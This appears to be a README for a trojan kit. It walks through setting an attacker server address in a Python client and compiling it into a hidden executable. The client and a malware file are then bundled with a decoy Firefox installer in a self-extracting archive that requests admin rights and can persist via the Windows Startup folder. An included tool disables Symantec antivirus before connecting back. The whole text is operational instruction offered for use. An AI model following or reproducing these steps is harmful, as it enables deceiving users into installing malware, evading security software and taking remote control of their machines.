Edit the client.py file by setting IP and port of the attacking Server listening and IP and port of any proxy present in the attack machine.If there is not a proxy comment the relative section.
Transform the client.py into exe, i used pyinstaller: pyinstaller -w -F client.py. -w optione allow to create a windowsless .exe, -F optione allow to create only one file.
Create self-extracting ZIP with wirrar selecting three file: a benevolant installer (ex: "firefox installer.exe"), client.exe and malware.exe.
In the settings of the self-extracting module, set the order of execution of the files, as first the benevolent installer and as the second the client.exe; select the checkbox to extract the files into a temporary folder or if you want to be more malicious specify the folder of the files that will be launched at the boot (%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup). 
Always in the settings of the self-extracting module select request access with administrative rights.
The file antivirus.exe is a windowsless .exe that disable Symantec antivirus. It will be launched by client.exe before connecting to the server.
The Malware.bat file contains the code of the homonymous .exe file. 

Enjoy :)